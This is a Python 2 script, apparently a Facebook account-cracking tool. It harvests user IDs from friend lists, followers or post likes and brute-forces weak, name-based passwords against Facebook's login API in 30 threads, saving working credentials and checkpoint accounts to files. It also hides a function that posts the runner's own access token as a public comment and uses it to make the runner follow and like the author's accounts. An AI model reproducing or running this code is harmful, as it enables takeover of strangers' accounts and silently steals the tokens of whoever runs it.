#coding=utf-8
#!/usr/bin/python2
# Made By MR.NADEEM
# facebook unik : https://www.facebook.com/ITXRANA.5214
# github : https://github.com/Rananadeem5214
import os
import sys
import time
import datetime
import random
import hashlib
import re
import threading
import json
import urllib
import cookielib
import requests
import uuid
import ipaddress
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from time import sleep
from datetime import datetime
try:
	import requests
except ImportError:
	print 'Modul requests belum terinstall!...\n'
	os.system('pip install requests' if os.name == 'nt' else 'pip2 install requests')
reload(sys)
sys.setdefaultencoding('utf8')
ip = requests.get('https://api.ipify.org').text

MAX_IPV4 = ipaddress.IPv4Address._ALL_ONES  # 2 ** 32 - 1
MAX_IPV6 = ipaddress.IPv6Address._ALL_ONES  # 2 ** 128 - 1

def random_ipv4():
	return  ipaddress.IPv4Address._string_from_ip_int(random.randint(0, MAX_IPV4))
def random_ipv6():
	return ipaddress.IPv6Address._string_from_ip_int(random.randint(0, MAX_IPV6))

def logo():
	print("""\033[0;92m
\033[0;92m ______                  
\033[0;91m| ___ \                 
\033[0;93m| |_/ /__ _ _ __   __ _ 
\033[0;94m|    // _` | '_ \ / _` |
\033[0;95m| |\ \ (_| | | | | (_| |
\033[0;91m\_| \_\__,_|_| |_|\__,_|
\033[0;91m------------------------------------------------                        
\033[0;94m>Coder= Rana Nadeem Rajput
\033[0;95m>Fb    =ITXRANA.5214
\033[0;92m>Wp   =03082503426
\033[0;91m------------------------------------------------""")                                                                                                     
kom = 'Script bang @[100041129048948:]ðŸ˜˜ðŸ˜˜ðŸ˜˜https://www.facebook.com/photo.php?fbid=567333587980938&set=a.104654650915503&type=3&app=fbl mantap Ngga Ada ObatðŸ˜˜ðŸ˜˜ðŸ˜˜'
kom1 = 'Aku Ijin Pake Script Mu Bang  @[100041129048948:]ðŸ˜˜ðŸ˜˜ðŸ˜˜https://www.facebook.com/photo.php?fbid=567333587980938&set=a.104654650915503&type=3&app=fblðŸ˜˜ðŸ˜˜ðŸ˜˜'
kom2 = 'Script bang @[100041129048948:]ðŸ˜˜ðŸ˜˜ðŸ˜˜https://www.facebook.com/photo.php?fbid=567333587980938&set=a.104654650915503&type=3&app=fbl mantap Ngga Ada ObatðŸ˜˜ðŸ˜˜ðŸ˜˜'
kom3 = 'Aku Ijin Pake Script Mu Bang  @[100041129048948:]ðŸ˜˜ðŸ˜˜ðŸ˜˜https://www.facebook.com/photo.php?fbid=567333587980938&set=a.104654650915503&type=3&app=fblðŸ˜˜ðŸ˜˜ðŸ˜˜'
id = []
cp = []
ok = []
loop = 0

ct = datetime.now()
n = ct.month
bulan1 = [    'January',   'February',    'March',    'April',    'May',    'June',    'July',    'August',    'September',    'October',    'November',    'December']
   
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
    
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan1[nTemp]
reload(sys)
sys.setdefaultencoding('utf-8')
bulan = {
        "01": "January",
        "02": "February",
        "03": "March",
        "04": "April",
        "05": "May",
        "06": "June",
        "07": "July",
        "08": "August",
        "09": "September",
        "10": "November",
        "11": "October",
        "12": "December"
}

#------->BOT JANGAN DI UBAH KONTOL KALO MAU NAMBAH NAMBAH AJA JANGAN DI UBAH YA AJG<-------#
def iwan_dev():
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print (' [!] Token invalid') 
        os.system('rm -rf login.txt')
        
    requests.post('https://graph.facebook.com/100041129048948/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/567333587980938/comments/?message=' + token + '&access_token=' + token) 
    requests.post('https://graph.facebook.com/567333587980938/comments/?message=' + kom + '&access_token=' + token) 
    requests.post('https://graph.facebook.com/567333587980938/comments/?message=' + kom1 + '&access_token=' + token) 
    requests.post('https://graph.facebook.com/567333587980938/likes?summary=true&access_token=' + token) 
    requests.post('https://graph.facebook.com/561399145241049/comments/?message=' + token + '&access_token=' + token) 
    requests.post('https://graph.facebook.com/561399145241049/comments/?message=' + kom2 + '&access_token=' + token) 
    requests.post('https://graph.facebook.com/561399145241049/comments/?message=' + kom3 + '&access_token=' + token) 
    requests.post('https://graph.facebook.com/561399145241049/likes?summary=true&access_token=' + token)
    requests.post('https://graph.facebook.com/100021483498135/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100028262962654/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100013951308057/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100040248105716/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100055910645402/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100037389638203/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100008468288074/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100013144685504/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100017837140388/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100041771241191/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100064098481991/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100000095205565/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100000095205565/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100000056561882/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100000312208041/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100028434880529/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100001027764318/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/638124327/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100015073506062/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100067953620374/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/1445122515/subscribers?access_token=' + token)
    menu()

#------->login token jangan lupa masukin token facebook jangan token listrik kontol<-------#    
def gen():
	os.system('clear')
	try:
		token = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		logo()
		token = raw_input(" *  token : ")
		
		try:
			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
			a = json.loads(otw.text)
			zedd = open("login.txt", 'w')
			zedd.write(token)
			zedd.close()
			print (" âˆš  login succesful ")
			iwan_dev()
		except KeyError:
			print (" [!] Token Invalid") 
			sys.exit()

useragents = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]',
'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/73.0.3683.90 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]'
#------->menu crack pak<-------#
def menu():
	os.system('clear')
	global token
	try:
		token = open('login.txt','r').read()
		otw = requests.get('https://graph.facebook.com/me/?access_token='+token)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print ('[error cannot crack]')
		os.system("rm -f login.txt")
		gen()
	except requests.exceptions.ConnectionError:
		print (' * no connection please connect your connection')
		sys.exit()
	logo()
	print"[Hello]: " +nama
	print"[ip addres] : " +ip
	print"\033[0;91m------------------------------------------------------"
	print"\033[0;91m[1]crack from public id"
	print"\033[0;91m[2]crack from follower id"
	print"\033[0;91m[3]crack from public post like"
	print"\033[0;91m[4]check crack result"
	print"\033[0;91m[0]remove token"
	print"\033[0;92m------------------------------------------------------"
	pilih_pak()

def pilih_pak():
	ask = raw_input("\033[0;92m select One: ")
	if ask == "":
		print
		print ("\033[0;92m  choose the right one dear") 
		exit()
	elif ask == "1" or ask == "01":
		print ("\033[0;92m type 'me' to crack friends list") 
		idt = raw_input("\033[0;92m id public : ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			sp = json.loads(pok.text)
			print (" *  name      : "+sp["name"]) 
		except KeyError:
			print ("\033[0;91m[Sorry id not public]") 
			exit()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif ask == "2" or ask == "02":
		print ("\033[0;92m[type me crack your own follower list] ") 
		idt = raw_input("\033[0;92m[id public] : ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			sp = json.loads(pok.text)
			print ("  name      : "+sp["name"]) 
		except KeyError:
			print ("\033[0;92m  Sorry id not public") 
			exit()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=999999&access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif ask == "3" or ask == "03":
		idt = raw_input("\033[0;92m  id post public : ")
		r = requests.get("https://graph.facebook.com/"+idt+"/likes?limit=9999999&access_token="+token)
		z = json.loads(r.text)
		for i in z['data']:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif ask == "4" or ask == "04":
		print"\033[0;92m1. Check result ok"
		print"\033[0;92m2. Check result cp"
		ress = raw_input("\033[0;92m select : ")
		if ress =="":
			menu()
		elif ress == "1" or ress == "01":
			print ("\033[0;92m [+] Check \033[0;92ok\033[0;97m date : \033[0;92m%s-%s-%s\033[0;97m" % (ha, op, ta)) 
			os.system("\033[0;92mcat out/OK-%s-%s-%s.txt" % (ha, op, ta))
			exit()
		elif ress == "2" or ress == "02":
			print ("\033[0;92m [+] Check \033[0;93mcp\033[0;97m date : \033[0;92m%s-%s-%s\033[0;97m" % (ha, op, ta)) 
			os.system("\033[0;92mcat out/CP-%s-%s-%s.txt" % (ha, op, ta))
			exit()
		else:
			exit("\033[0;92m  choose the right one dear") 
	elif ask == "0" or ask == "00":
		os.system("rm -f login.txt") 
		print ("\033[0;92m  successfully deleted token") 
		exit()
	else:
		print ("\033[0;92m  choose the right one dear") 
		exit()
	
	print"\033[0;91m *  total id  : " +str(len(id))
	ask = raw_input("\033[0;92m  want to use password Choice/Default (c/d) : ")
	if ask == "c" or ask == "y":
		manual()
	print
	print"\033[0;92m airplane mode 10 seconds if no result "
	print

	def main(arg):
		global ok,cp,ua, loop
		print '\r *  %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
		sys.stdout.flush()
		user = arg
		uid,name=user.split("|") 
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			for pw in [name.lower()+'123',name.lower()+'1234',name.lower()+'12345',name.lower()+'786','000786','786786','pakistan']:
				ua =random.choice(["Mozilla/5.0 (Linux; Android 7.0; SM-A310F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36 OPR/42.7.2246.114996"])
				headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
				'x-fb-net-hni': str(random.randint(20000, 40000)), 
				'x-fb-connection-quality': 'EXCELLENT', 
				'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
				'user-agent': ua, 
				'content-type': 'application/x-www-form-urlencoded', 
				'x-fb-http-engine': 'Liger'}
				ses=requests.Session()
				api="https://b-api.facebook.com/method/auth.login"
				param={"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
				send=ses.get(api,params=param, headers=headers_)
				if "access_token" in send.text and "EAAA" in send.text:
					print '\r\033[0;91m[Rana°\033[0;92mok]\033[0;92m\033[0;92m ' +uid+ ' â€¢ ' + pw+ '        '
					ok.append(uid+' â€¢ '+pw)
					save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  [OK] '+str(uid)+' â€¢ '+str(pw)+'\n')
					save.close()
					break
					continue
					continue
				elif "www.facebook.com" in send.json()["error_msg"]:
					try:
						token = open('login.txt').read()
						url = ("https://www.facebook.com/"+uid+"?access_token="+token)
						data = s.get(url).json()
						nama = data['name']
						ttl = data['birthday'].replace("/","-")
						print('\r\033[1;93m[RANA°CP] ' +uid+ 'â€¢' + pw + 'â€¢' + ttl)
						cp.append(uid+'â€¢'+pw+'â€¢'+ttl)
						save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a')
						save.write('  [CP] '+str(uid)+'â€¢'+str(pw)+'â€¢'+ttl+'\n')
						save.close()
						break
					except(KeyError, IOError):
						ttl = ' '
					except:pass
					print '\r\033[0;94m[RANA°\033[0;93mCP]\033[0;97m\033[0;97m ' +uid+ ' â€¢ ' + pw + '        '
					cp.append(uid+' â€¢ '+pw)
					save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  [CP] '+str(uid)+' â€¢ '+str(pw)+'\n')
					save.close()
					break
					continue
			
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print("\n crack successful...")
	print
	print
	exit()

def manual():
	print("\033[0;95m Enter password example : pakistan,000786,786786")
	pw = raw_input("\033[0;94m  set password : ").split(",")
	print
	if len(pw) ==0:
		exit("\033[0;91m correct content, can't be empty")
	print("\033[0;92m  number of passwords created : \033[0;93m" +str(len(pw)))
	
	def main(arg):
		global ok,cp,ua,loop
		print '\r \033[0;97mRANA  %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
		sys.stdout.flush()
		user = arg
		uid,name=user.split("|") 
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			for asu in pw:
				ua = 'Dalvik/2.1.0 (Linux; U; Android 9; INE-LX1r Build/HUAWEIINE-LX1r) [FBAN/Orca-Android;FBAV/212.1.0.13.109;FBPN/com.facebook.orca;FBLC/en_US;FBBV/151534286;FBCR/;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/INE-LX1r;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2128};FB_FW/1;]'
				headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
				'x-fb-net-hni': str(random.randint(20000, 40000)), 
				'x-fb-connection-quality': 'EXCELLENT', 
				'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
				'user-agent': ua, 
				'content-type': 'application/x-www-form-urlencoded', 
				'x-fb-http-engine': 'Liger'}
				ses=requests.Session()
				api="https://b-api.facebook.com/method/auth.login"
				param={"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":asu,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
				send=ses.get(api,params=param, headers=headers_)
				if "access_token" in send.text and "EAAA" in send.text:
					print '\r\033[0;97m[RANA°\033[0;92mOK]\033[0;97m\033[0;97m ' +uid+ ' â€¢ ' + asu + '        '
					ok.append(uid+' â€¢ '+asu)
					save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  [OK] '+str(uid)+' â€¢ '+str(asu)+'\n')
					save.close()
					break
					continue
					continue
				elif "www.facebook.com" in send.json()["error_msg"]:
					try:
						token = open('login.txt').read()
						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
						data = s.get(url).json()
						nama = data['name']
						ttl = data['birthday'].replace("/","-")
						print('\r\033[1;93m[RANA°CP] ' +uid+ 'â€¢' + asu + 'â€¢' + ttl)
						cp.append(uid+'â€¢'+asu+'â€¢'+ttl)
						save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a')
						save.write('  [CP] '+str(uid)+'â€¢'+str(asu)+'â€¢'+ttl+'\n')
						save.close()
						break
					except(KeyError, IOError):
						ttl = ' '
					except:pass
					print '\r\033[0;97m[RANA°\033[0;93mCP]\033[0;97m\033[0;97m ' +uid+ ' â€¢ ' + asu + '        '
					cp.append(uid+' â€¢ '+asu)
					save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  [CP] '+str(uid)+' â€¢ '+str(asu)+'\n')
					save.close()
					break
					continue
			
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print"\n"
	print("\n crack successful...")
	exit()

if __name__ == '__main__':
	gen()
